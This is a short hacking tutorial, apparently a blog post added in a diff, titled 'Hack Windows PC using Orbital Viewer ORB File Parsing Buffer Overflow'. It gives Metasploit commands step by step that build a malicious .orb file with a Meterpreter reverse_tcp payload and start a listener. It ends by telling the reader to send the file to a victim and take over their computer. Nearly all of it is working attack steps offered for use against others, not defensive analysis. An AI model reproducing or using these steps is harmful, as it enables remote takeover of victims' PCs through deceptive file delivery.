@@ -1,0 +1,25 @@
+
+Hack Windows PC using Orbital Viewer ORB File Parsing Buffer Overflow
+
+This module exploits a stack-based buffer overflow in David Manthey’s Orbital Viewer. When processing .ORB files, data is read from file into a fixed-size stack buffer using the fscanf function. Since no bounds checking are done, a buffer overflow can occur. Attackers can execute arbitrary code by convincing their victim to open an ORB file.
+Orbital Viewer 1.04
+Attacker: Backtrack 5
+Victim PC: Windows XP SP 2
+Open backtrack terminal type msfconsole
+
+Now type use exploit/windows/fileformat/orbital_viewer_orb
+msf exploit (orbital_viewer_orb)>set payload windows/meterpreter/reverse_tcp
+msf exploit (orbital_viewer_orb)>set lhost 192.168.1.2 (IP of Local Host)
+msf exploit (orbital_viewer_orb)>exploit 
+
+After we successfully generate the malicious orb File, it will stored on your local computer
+/root/.msf4/local/msf.orb
+
+Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.1.2
+exploit
+Now send your msf.orb files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
+
+
